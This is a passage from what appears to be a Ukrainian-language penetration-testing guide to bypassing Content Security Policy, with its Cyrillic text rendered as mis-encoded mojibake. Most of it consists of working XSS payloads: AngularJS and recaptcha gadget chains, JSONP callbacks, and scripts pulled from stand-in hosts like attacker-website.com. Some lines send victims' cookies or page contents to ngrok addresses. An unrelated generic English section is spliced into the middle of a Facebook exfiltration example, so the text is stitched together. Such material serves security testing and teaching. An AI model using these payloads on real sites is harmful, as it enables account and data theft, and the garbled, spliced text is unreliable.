* `'unsafe-allow-redirects'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏, —è–∫—ñ –Ω–µ–≥–∞–π–Ω–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å –Ω–∞ —ñ–Ω—à–∏–π —Ä–µ—Å—É—Ä—Å. –ù–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø—ñ–¥—Ç–æ—á—É—î –±–µ–∑–ø–µ–∫—É.

## –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ CSP

### 'unsafe-inline'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```

–†–æ–±–æ—á–∏–π –≤–ø–ª–∏–≤: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' —á–µ—Ä–µ–∑ Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```

–†–æ–±–æ—á–∏–π –≤–º—ñ—Å—Ç:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### strict-dynamic

–Ø–∫—â–æ –≤–∏ —è–∫–æ—Å—å –∑–º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ **–¥–æ–∑–≤–æ–ª–µ–Ω–∏–π JS-–∫–æ–¥ —Å—Ç–≤–æ—Ä–∏–≤ –Ω–æ–≤–∏–π —Ç–µ–≥ —Å–∫—Ä–∏–ø—Ç–∞** –≤ DOM –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∞—à–æ–≥–æ JS-–∫–æ–¥—É, —Ç–æ–º—É —â–æ –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π —Å–∫—Ä–∏–ø—Ç —Å—Ç–≤–æ—Ä—é—î –π–æ–≥–æ, **–Ω–æ–≤–∏–π —Ç–µ–≥ —Å–∫—Ä–∏–ø—Ç–∞ –±—É–¥–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏**.

### Wildcard (\*)

```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```

–†–æ–±–æ—á–∏–π –≤–µ–∫—Ç–æ—Ä:

```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

### –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å object-src —Ç–∞ default-src

{% hint style="danger" %}
**–ó–¥–∞—î—Ç—å—Å—è, —Ü–µ –≤–∂–µ –Ω–µ –ø—Ä–∞—Ü—é—î**
{% endhint %}

```yaml
Content-Security-Policy: script-src 'self' ;
```

–†–æ–±–æ—á—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:

```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ + 'self'

```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª JS, –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü–µ–π CSP:

–†–æ–±–æ—á–∏–π –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è:

```markup
"/>'><script src="/uploads/picture.png.js"></script>
```

–û–¥–Ω–∞–∫, –≤–∏—Å–æ–∫–∞ –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ —Å–µ—Ä–≤–µ—Ä **–ø–µ—Ä–µ–≤—ñ—Ä—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π —Ñ–∞–π–ª** —ñ –¥–æ–∑–≤–æ–ª–∏—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ª–∏—à–µ **–≤–∏–∑–Ω–∞—á–µ–Ω–∏–π —Ç–∏–ø —Ñ–∞–π–ª—ñ–≤**.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **JS-–∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—É** —Ñ–∞–π–ª—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, —è–∫–µ –ø—Ä–∏–π–º–∞—î—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: _script.png_), —Ü—å–æ–≥–æ –±—É–¥–µ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–µ—è–∫—ñ —Å–µ—Ä–≤–µ—Ä–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–µ—Ä–≤–µ—Ä apache, **–≤–∏–±–∏—Ä–∞—é—Ç—å MIME-—Ç–∏–ø —Ñ–∞–π–ª—É –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è**, –∞ –±—Ä–∞—É–∑–µ—Ä–∏, —Ç–∞–∫—ñ —è–∫ Chrome, **–≤—ñ–¥–º–æ–≤–ª—è—Ç—å—Å—è –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥ Javascript** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —á–æ–≥–æ—Å—å, —â–æ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è–º. "–ù–∞ —â–∞—Å—Ç—è", —Ç—É—Ç —î –ø–æ–º–∏–ª–∫–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ CTF —è –¥—ñ–∑–Ω–∞–≤—Å—è, —â–æ **Apache –Ω–µ —Ä–æ–∑–ø—ñ–∑–Ω–∞—î** —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è _**.wave**_, —Ç–æ–º—É –Ω–µ –Ω–∞–¥–∞—î –π–æ–º—É **MIME-—Ç–∏–ø, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ audio/\***.

–û—Ç–∂–µ, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ XSS —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É, —ñ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è –∑–Ω–∞–π—Ç–∏ **–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª –∑ —Ü–∏–º —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º —Ç–∞ –≤–º—ñ—Å—Ç–æ–º —Å–∫—Ä–∏–ø—Ç–∞. –ê–±–æ, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ —Ñ–∞–π–ª—É, —Å—Ç–≤–æ—Ä—ñ—Ç—å –ø–æ–ª—ñ–≥–ª–æ—Ç ([–¥–µ–∫—ñ–ª—å–∫–∞ –ø—Ä–∏–∫–ª–∞–¥—ñ–≤ –ø–æ–ª—ñ–≥–ª–æ—Ç—ñ–≤ —Ç—É—Ç](https://github.com/Polydet/polyglot-database)).

### –î—ñ—è —Ñ–æ—Ä–º–∏

–Ø–∫—â–æ –Ω–µ–º–æ–∂–ª–∏–≤–æ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ JS, –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏—Ç—è–≥—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, **–≤–ø—Ä–æ–≤–∞–¥–∂—É—é—á–∏ –¥—ñ—é —Ñ–æ—Ä–º–∏** (—ñ –º–æ–∂–ª–∏–≤–æ –æ—á—ñ–∫—É–≤–∞—Ç–∏, —â–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∏ –ø–∞—Ä–æ–ª—ñ–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–∞–ø–æ–≤–Ω—è—Ç—å –ø–∞—Ä–æ–ª—ñ). –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–ø—Ä–∏–∫–ª–∞–¥ —É —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). –¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ `default-src` –Ω–µ –æ—Ö–æ–ø–ª—é—î –¥—ñ—ó —Ñ–æ—Ä–º–∏.

### –ï–∫—Å–ø–æ—Ä—Ç –¥–æ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ + ('unsafe-eval')

{% hint style="warning" %}
–î–ª—è –¥–µ—è–∫–∏—Ö –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å **`unsafe-eval` –Ω–∞–≤—ñ—Ç—å –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ**.
{% endhint %}

```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –≤—Ä–∞–∑–ª–∏–≤—É –≤–µ—Ä—Å—ñ—é angular —Ç–∞ –≤–∏–∫–æ–Ω–∞–π—Ç–µ –¥–æ–≤—ñ–ª—å–Ω–∏–π JS:

```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

#### –ü–µ–π–ª–æ–∞–¥–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Angular + –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –∑ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏, —è–∫—ñ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å –æ–±'—î–∫—Ç `window` ([–ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü–µ–π –ø–æ—Å—Ç](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
–£ –ø–æ—Å—Ç—ñ –ø–æ–∫–∞–∑–∞–Ω–æ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** –≤—Å—ñ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏** –∑ `cdn.cloudflare.com` (–∞–±–æ –±—É–¥—å-—è–∫–æ–≥–æ —ñ–Ω—à–æ–≥–æ –¥–æ–∑–≤–æ–ª–µ–Ω–æ–≥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é JS-–±—ñ–±–ª—ñ–æ—Ç–µ–∫), –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥–æ–¥–∞–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ –∫–æ–∂–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, **—è–∫—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ —è–∫–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å –æ–±'—î–∫—Ç `window`**.
{% endhint %}

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```

Angular XSS –∑ –Ω–∞–∑–≤–∏ –∫–ª–∞—Å—É:

```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∫–æ–¥–æ–º google recaptcha JS

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ CSP –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ JS-–∫–æ–¥—É, –æ–±—Ö—ñ–¥ CSP:

```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

–ë—ñ–ª—å—à–µ [**–ø–µ–π–ª–æ–∞–¥—ñ–≤ –∑ —Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è www.google.com –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è

–ù–∞—Å—Ç—É–ø–Ω–∞ URL-–∞–¥—Ä–µ—Å–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –Ω–∞ example.com (–∑ [—Ç—É—Ç](https://www.landh.tech/blog/20240304-google-hack-50000/)):

```
https://www.google.com/amp/s/example.com/
```

–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è \*.google.com/script.google.com

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Google Apps Script –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ script.google.com. –Ø–∫ —Ü–µ [–∑—Ä–æ–±–ª–µ–Ω–æ –≤ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### –°—Ç–æ—Ä–æ–Ω–Ω—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ + JSONP

```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```

–°—Ü–µ–Ω–∞—Ä—ñ—ó, –¥–µ `script-src` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `self` —Ç–∞ –ø–µ–≤–Ω–∏–π –¥–æ–º–µ–Ω, —è–∫–∏–π –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É, –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JSONP. –ö—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ JSONP –¥–æ–∑–≤–æ–ª—è—é—Ç—å –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ –º–µ—Ç–æ–¥–∏ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É, —â–æ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –≤–∏–∫–æ–Ω–∞—Ç–∏ XSS, —Ä–æ–±–æ—á–∏–π –ø–µ–π–ª–æ–∞–¥:

```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

[**JSONBee**](https://github.com/zigoo0/JSONBee) **–º—ñ—Å—Ç–∏—Ç—å –≥–æ—Ç–æ–≤—ñ –¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è JSONP-—Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É –¥–ª—è –æ–±—Ö—ñ–¥—É CSP –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö –≤–µ–±-—Å–∞–π—Ç–∞—Ö.**

–¢–∞ –∂ —Å–∞–º–∞ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–Ω–µ, —è–∫—â–æ **–¥–æ–≤—ñ—Ä—á–∞ —Ç–æ—á–∫–∞ –¥–æ—Å—Ç—É–ø—É –º—ñ—Å—Ç–∏—Ç—å –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**, –æ—Å–∫—ñ–ª—å–∫–∏, —è–∫—â–æ –ø–æ—á–∞—Ç–∫–æ–≤–∞ —Ç–æ—á–∫–∞ –¥–æ—Å—Ç—É–ø—É —î –¥–æ–≤—ñ—Ä–µ–Ω–æ—é, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —î –¥–æ–≤—ñ—Ä–µ–Ω–∏–º.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ç—Ä–µ—Ç—ñ–º–∏ —Å—Ç–æ—Ä–æ–Ω–∞–º–∏

–Ø–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ [—Ü—å–æ–º—É –ø–æ—Å—Ç—ñ](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), —ñ—Å–Ω—É—î –±–∞–≥–∞—Ç–æ –¥–æ–º–µ–Ω—ñ–≤ —Ç—Ä–µ—Ç—ñ—Ö —Å—Ç–æ—Ä—ñ–Ω, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–µ—Å—å —É CSP, —ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≤–∏—Ç–æ–∫—É –¥–∞–Ω–∏—Ö –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JavaScript-–∫–æ–¥—É. –î–µ—è–∫—ñ –∑ —Ü–∏—Ö —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö —Å–ª—É–∂–±:

| –°—É—Ç–Ω—ñ—Å—Ç—å          | –î–æ–∑–≤–æ–ª–µ–Ω–∏–π –¥–æ–º–µ–Ω                             | –ú–æ–∂–ª–∏–≤–æ—Å—Ç—ñ       |
| ----------------- | -------------------------------------------- | ---------------- |
| Facebook          | www.facebook.com, \*.facebook.com            | –í–∏—Ç—ñ–∫            |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | –í–∏—Ç—ñ–∫            |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | –í–∏–∫–æ–Ω–∞–Ω–Ω—è        |
| Amazon CloudFront | \*.cloudfront.net                            | –í–∏—Ç—ñ–∫, –í–∏–∫–æ–Ω–∞–Ω–Ω—è |
| Amazon AWS        | \*.amazonaws.com                             | –í–∏—Ç—ñ–∫, –í–∏–∫–æ–Ω–∞–Ω–Ω—è |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | –í–∏—Ç—ñ–∫, –í–∏–∫–æ–Ω–∞–Ω–Ω—è |
| Salesforce Heroku | \*.herokuapp.com                             | –í–∏—Ç—ñ–∫, –í–∏–∫–æ–Ω–∞–Ω–Ω—è |
| Google Firebase   | \*.firebaseapp.com                           | –í–∏—Ç—ñ–∫, –í–∏–∫–æ–Ω–∞–Ω–Ω—è |

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ –±—É–¥—å-—è–∫—ñ –∑ –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö –¥–æ–º–µ–Ω—ñ–≤ —É CSP –≤–∞—à–æ—ó —Ü—ñ–ª—ñ, —î –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å, —â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ CSP, –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—à–∏—Å—å –Ω–∞ —Å–ª—É–∂–±—ñ —Ç—Ä–µ—Ç—å–æ—ó —Å—Ç–æ—Ä–æ–Ω–∏ —ñ, –∞–±–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –¥–∞–Ω—ñ –Ω–∞ —Ü—é —Å–ª—É–∂–±—É, –∞–±–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π CSP:

```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```

### CSP Bypass

#### Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. However, misconfigurations or bypasses in CSP can lead to security vulnerabilities.

#### Bypass Techniques

1. **Inline Scripts**: By using inline event handlers or script tags, attackers can execute arbitrary code even if CSP is in place.
2. **Unsafe Inline**: CSP directives like `unsafe-inline` allow the execution of inline scripts, which can be exploited by attackers.
3. **Data Protocol**: Attackers can use the `data:` protocol to embed scripts within HTML attributes, bypassing CSP restrictions.
4. **Nonce Bypass**: If a website uses nonces for script-src, attackers can bypass CSP by injecting scripts with a valid nonce.
5. **Self Bypass**: By allowing `'self'` as a valid source, attackers can host malicious scripts on the same domain to bypass CSP.
6. **Whitelist Bypass**: Attackers can exploit misconfigured whitelists to load scripts from unauthorized sources.

#### Conclusion

Understanding common CSP bypass techniques is crucial for security professionals to effectively secure web applications against potential attacks. Regularly testing and updating CSP configurations can help prevent security vulnerabilities.

```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```

–ú–∞—î—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏—Ç—è–≥—Ç–∏ –¥–∞–Ω—ñ, —Ç–∞–∫ —Å–∞–º–æ, —è–∫ —Ü–µ –∑–∞–≤–∂–¥–∏ —Ä–æ–±–∏–ª–æ—Å—è –∑ [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –≤–∏–∫–æ–Ω—É—î—Ç–µ —Ç–∞–∫—ñ –∑–∞–≥–∞–ª—å–Ω—ñ –∫—Ä–æ–∫–∏:

1. –°—Ç–≤–æ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ Facebook —Ç—É—Ç.
2. –°—Ç–≤–æ—Ä—ñ—Ç—å –Ω–æ–≤–∏–π –¥–æ–¥–∞—Ç–æ–∫ "Facebook Login" —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å "–í–µ–±-—Å–∞–π—Ç".
3. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ "–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è -> –û—Å–Ω–æ–≤–Ω–µ" —Ç–∞ –æ—Ç—Ä–∏–º–∞–π—Ç–µ —Å–≤—ñ–π "–Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –¥–æ–¥–∞—Ç–∫–∞".
4. –ù–∞ —Ü—ñ–ª—å–æ–≤–æ–º—É —Å–∞–π—Ç—ñ, –∑ —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –¥–∞–Ω—ñ, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≥–∞–¥–∂–µ—Ç Facebook SDK "fbq" —á–µ—Ä–µ–∑ "customEvent" —Ç–∞ –¥–∞–Ω—ñ –≤–∞–Ω—Ç–∞–∂—É.
